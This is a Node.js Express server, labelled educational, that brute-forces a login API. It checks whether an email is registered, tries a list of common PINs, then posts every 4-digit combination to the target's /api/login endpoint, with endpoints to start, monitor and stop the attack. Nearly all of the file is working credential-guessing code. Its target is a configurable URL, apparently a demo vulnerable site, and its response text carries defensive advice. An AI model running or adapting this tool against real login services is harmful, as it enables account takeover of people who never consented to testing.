const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors({
    origin: '*', // Allow all origins for testing
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Configuration
const VULNERABLE_SITE_URL = process.env.VULNERABLE_SITE_URL || 'https://vulnerable-site-noch.onrender.com';

// Global variables for tracking brute force progress
let bruteForceActive = false;
let currentProgress = {
    email: '',
    tested: 0,
    found: false,
    password: null,
    startTime: null,
    currentPassword: null
};

// EDUCATIONAL: Full brute force - TESTS ALL 10,000 COMBINATIONS
async function fullBruteForceAttack(email) {
    if (bruteForceActive) {
        return { error: 'Another brute force attack is already in progress' };
    }
    
    bruteForceActive = true;
    currentProgress = {
        email: email,
        tested: 0,
        found: false,
        password: null,
        startTime: Date.now(),
        currentPassword: '0000'
    };
    
    console.log(`\n🔍 Starting FULL brute-force attack for: ${email}`);
    console.log('⚠️  Testing ALL 10,000 combinations (0000 to 9999)');
    console.log('⏳ This will take approximately 8-15 minutes...');
    
    const results = {
        email: email,
        tested: 0,
        found: false,
        password: null,
        startTime: currentProgress.startTime,
        endTime: null,
        totalTime: null,
        attempts: []
    };
    
    // Test if user exists first
    try {
        console.log('Checking if user exists...');
        const checkResponse = await axios.get(`${VULNERABLE_SITE_URL}/api/check-user/${email}`, {
            timeout: 10000
        });
        
        if (!checkResponse.data.exists) {
            console.log('❌ User not found in vulnerable database');
            bruteForceActive = false;
            return { 
                ...results, 
                error: 'User not found. Please register first at the vulnerable site.' 
            };
        }
        console.log('✅ User found in database');
    } catch (error) {
        console.error('Error checking user:', error.message);
        bruteForceActive = false;
        return { 
            ...results, 
            error: 'Cannot connect to vulnerable site. Make sure it\'s running.' 
        };
    }
    
    // FULL BRUTE FORCE: Test ALL combinations from 0000 to 9999
    const startNum = 0;
    const endNum = 9999;
    
    console.log(`\n🎯 Starting from: ${startNum.toString().padStart(4, '0')}`);
    console.log(`🎯 Ending at: ${endNum.toString().padStart(4, '0')}`);
    console.log(`🎯 Total to test: ${endNum - startNum + 1} combinations\n`);
    
    for (let i = startNum; i <= endNum; i++) {
        if (!bruteForceActive) break; // Allow cancellation
        
        const password = i.toString().padStart(4, '0');
        currentProgress.tested = i - startNum + 1;
        currentProgress.currentPassword = password;
        results.tested = currentProgress.tested;
        
        try {
            const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
                email,
                password
            }, {
                timeout: 3000 // 3 second timeout
            });
            
            if (response.data.success) {
                results.endTime = Date.now();
                results.totalTime = (results.endTime - results.startTime) / 1000;
                results.found = true;
                results.password = password;
                
                console.log(`\n✅✅✅ PASSWORD CRACKED! ✅✅✅`);
                console.log(`🔓 Password found: ${password}`);
                console.log(`📊 Attempts: ${results.tested}`);
                console.log(`⏱️  Time: ${results.totalTime.toFixed(2)} seconds`);
                console.log(`⚡ Speed: ${(results.tested / results.totalTime).toFixed(2)} attempts/second`);
                
                bruteForceActive = false;
                return results;
            }
        } catch (error) {
            // Most errors will be 401 (wrong password) - just continue
            if (!(error.response && error.response.status === 401)) {
                console.log(`   Error at ${password}: ${error.message}`);
            }
        }
        
        // Progress indicator
        if (i % 500 === 0) {
            const elapsed = (Date.now() - results.startTime) / 1000;
            const rate = i / elapsed;
            const remaining = (10000 - i) / rate;
            const percent = ((i / 10000) * 100).toFixed(1);
            
            console.log(`   Progress: ${percent}% (${i}/10000)`);
            console.log(`   Current: ${password}`);
            console.log(`   Elapsed: ${elapsed.toFixed(0)}s, ETA: ${remaining.toFixed(0)}s remaining\n`);
        }
        
        // Rate limiting - 20ms delay (50 attempts/second)
        await new Promise(resolve => setTimeout(resolve, 20));
    }
    
    results.endTime = Date.now();
    results.totalTime = (results.endTime - results.startTime) / 1000;
    
    console.log(`\n📊 FULL BRUTE FORCE COMPLETED:`);
    console.log(`   Tested: ${results.tested} passwords`);
    console.log(`   Found: ${results.found ? 'YES' : 'NO'}`);
    console.log(`   Total time: ${results.totalTime.toFixed(2)} seconds`);
    console.log(`   Average speed: ${(results.tested / results.totalTime).toFixed(2)} attempts/second`);
    
    if (!results.found) {
        results.message = `⚠️ Password not found after testing ALL 10,000 combinations!`;
        results.message += `\n\n🔍 Possible reasons:`;
        results.message += `\n• The user might not exist (but we checked earlier)`;
        results.message += `\n• There might be a technical issue`;
        results.message += `\n• Let's verify with a direct test...`;
    }
    
    bruteForceActive = false;
    return results;
}

// Quick brute force (for web demo - tests up to 500 combinations)
async function quickBruteForce(email, maxAttempts = 500) {
    console.log(`\n🔍 Quick brute force for: ${email}`);
    console.log(`⏳ Testing up to ${maxAttempts} combinations...`);
    
    const startTime = Date.now();
    const results = {
        email: email,
        tested: 0,
        found: false,
        password: null,
        startTime: startTime,
        endTime: null,
        totalTime: null
    };
    
    // Test if user exists first
    try {
        const checkResponse = await axios.get(`${VULNERABLE_SITE_URL}/api/check-user/${email}`, {
            timeout: 10000
        });
        
        if (!checkResponse.data.exists) {
            return { 
                ...results, 
                error: 'User not found. Please register first.' 
            };
        }
    } catch (error) {
        return { 
            ...results, 
            error: 'Cannot connect to vulnerable site.' 
        };
    }
    
    // Start from common passwords, then sequential
    const commonPasswords = [
        '1234', '1111', '0000', '1212', '1004', '2000', '4444', '2222',
        '6969', '9999', '3333', '5555', '6666', '1122', '1313', '8888',
        '2001', '4321', '1010', '2580', '0852', '0007', '0070', '0707',
        '7777', '5678', '6789', '9876', '5432', '2323', '1123', '1221',
        '1000', '2002', '7860', '1080', '1008', '1507', '1947', '1948',
        '2027', '0720', '2707', '2024', '2023', '2022', '2021', '2020'
    ];
    
    // Test common passwords first
    for (const password of commonPasswords) {
        results.tested++;
        
        try {
            const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
                email,
                password
            }, { timeout: 3000 });
            
            if (response.data.success) {
                results.endTime = Date.now();
                results.totalTime = (results.endTime - startTime) / 1000;
                results.found = true;
                results.password = password;
                return results;
            }
        } catch (error) {
            // Continue on error
        }
        
        await new Promise(resolve => setTimeout(resolve, 20));
    }
    
    // Test sequential combinations
    const startFrom = 0;
    const endAt = Math.min(maxAttempts - commonPasswords.length, 10000);
    
    for (let i = startFrom; i < endAt; i++) {
        const password = i.toString().padStart(4, '0');
        
        // Skip already tested common passwords
        if (commonPasswords.includes(password)) continue;
        
        results.tested++;
        
        try {
            const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
                email,
                password
            }, { timeout: 3000 });
            
            if (response.data.success) {
                results.endTime = Date.now();
                results.totalTime = (results.endTime - startTime) / 1000;
                results.found = true;
                results.password = password;
                return results;
            }
        } catch (error) {
            // Continue on error
        }
        
        // Progress
        if (results.tested % 100 === 0) {
            console.log(`   Tested ${results.tested} passwords...`);
        }
        
        await new Promise(resolve => setTimeout(resolve, 20));
    }
    
    results.endTime = Date.now();
    results.totalTime = (results.endTime - startTime) / 1000;
    
    return results;
}

// API Endpoints

// Main demo endpoint (quick test)
app.post('/api/demo-brute-force', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email is required' });
        }
        
        console.log(`\n🎓 Starting educational demo for: ${email}`);
        
        const results = await quickBruteForce(email, 500);
        
        // Calculate stats
        const attemptsPerSecond = results.totalTime ? 
            (results.tested / results.totalTime).toFixed(2) : 0;
        const estimatedFullTime = attemptsPerSecond ? 
            (10000 / attemptsPerSecond) / 60 : 5;
        
        res.json({
            success: true,
            educational: true,
            message: results.found ? 
                `✅ Password cracked in ${results.tested} attempts!` :
                `Password not found in ${results.tested} attempts.`,
            results: results,
            statistics: {
                total_combinations: 10000,
                tested: results.tested,
                percentage: ((results.tested / 10000) * 100).toFixed(2) + '%',
                time_seconds: results.totalTime ? results.totalTime.toFixed(2) : 'N/A',
                attempts_per_second: attemptsPerSecond,
                estimated_full_attack_minutes: estimatedFullTime.toFixed(1)
            },
            security_lessons: results.found ? [
                `🚨 PASSWORD CRACKED: ${results.password}`,
                `📊 Cracked in only ${results.tested} attempts`,
                `⏱️  Time: ${results.totalTime ? results.totalTime.toFixed(2) : 'N/A'} seconds`,
                `🔓 4-digit PINs are EXTREMELY vulnerable`,
                `⚡ A real attack tests ALL 10,000 combinations in minutes`,
                `🔒 Always use strong, complex passwords`,
                `🚫 Implement rate limiting and account lockout`
            ] : [
                `Tested ${results.tested} combinations without success`,
                `But remember: there are 10,000 total possibilities`,
                `At ${attemptsPerSecond} attempts/second:`,
                `→ Full attack would take ~${estimatedFullTime.toFixed(1)} minutes`,
                `→ Real tools are 10x faster (2-5 minutes total)`,
                `🚨 This demonstrates the insecurity of 4-digit PINs`,
                `🔒 Minimum recommendation: 12+ character passwords`,
                `✅ Use mixed case, numbers, and symbols`,
                `🛡️ Implement multi-factor authentication`
            ]
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// FULL brute force endpoint (tests all 10,000)
app.post('/api/full-brute-force', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email is required' });
        }
        
        if (bruteForceActive) {
            return res.status(429).json({
                error: 'A brute force attack is already in progress',
                current_progress: currentProgress
            });
        }
        
        console.log(`\n🚀 Starting FULL brute force request for: ${email}`);
        
        // Start the brute force in the background
        fullBruteForceAttack(email).then(results => {
            console.log(`\n🎯 Full brute force completed for ${email}`);
        }).catch(error => {
            console.error('Brute force error:', error);
        });
        
        // Return immediate response
        res.json({
            success: true,
            message: 'Full brute force attack started in background',
            note: 'This will test ALL 10,000 combinations (0000-9999)',
            estimated_time: '8-15 minutes',
            check_progress: 'GET /api/brute-force-progress',
            stop_attack: 'POST /api/stop-brute-force'
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Check progress endpoint
app.get('/api/brute-force-progress', (req, res) => {
    res.json({
        active: bruteForceActive,
        progress: currentProgress,
        percentage: bruteForceActive ? 
            ((currentProgress.tested / 10000) * 100).toFixed(2) + '%' : '0%',
        estimated_time_remaining: bruteForceActive ? 
            `${((10000 - currentProgress.tested) / 50 / 60).toFixed(1)} minutes` : 'N/A'
    });
});

// Stop brute force endpoint
app.post('/api/stop-brute-force', (req, res) => {
    bruteForceActive = false;
    res.json({
        success: true,
        message: 'Brute force attack stopped',
        final_progress: currentProgress
    });
});

// Test specific password
app.post('/api/test-password', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password required' });
        }
        
        console.log(`Testing: ${email} with password: ${password}`);
        
        const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
            email,
            password
        }, { timeout: 5000 });
        
        res.json({
            success: response.data.success,
            message: response.data.message,
            password_tested: password,
            vulnerable_site: VULNERABLE_SITE_URL
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            password_tested: req.body.password
        });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        service: 'full-brute-force-demo',
        vulnerable_site: VULNERABLE_SITE_URL,
        brute_force_active: bruteForceActive,
        endpoints: [
            'POST /api/demo-brute-force - Quick demo (500 attempts)',
            'POST /api/full-brute-force - Full 10,000 combination attack',
            'GET /api/brute-force-progress - Check attack progress',
            'POST /api/stop-brute-force - Stop current attack',
            'POST /api/test-password - Test specific password',
            'GET /health - Health check'
        ]
    });
});

// Serve frontend
app.use(express.static('frontend'));

const PORT = process.env.PORT || 5002;
app.listen(PORT, () => {
    console.log(`\n🎓 FULL BRUTE FORCE DEMO running on port ${PORT}`);
    console.log('==============================================');
    console.log(`🎯 Target: ${VULNERABLE_SITE_URL}`);
    console.log('⚠️  DEMONSTRATES: 4-digit PIN vulnerability');
    console.log('⚠️  EDUCATIONAL USE ONLY');
    console.log('\n🔧 Endpoints:');
    console.log('• POST /api/demo-brute-force - Quick demo');
    console.log('• POST /api/full-brute-force - Full attack (10K combos)');
    console.log('• GET  /api/brute-force-progress - Check progress');
    console.log('• POST /api/test-password - Test specific password');
    console.log('• GET  /health - Health check');
    console.log('\n🌐 Access the frontend at:');
    console.log(`   http://localhost:${PORT} (local)`);
    console.log(`   https://attacker-site.onrender.com (production)`);
});
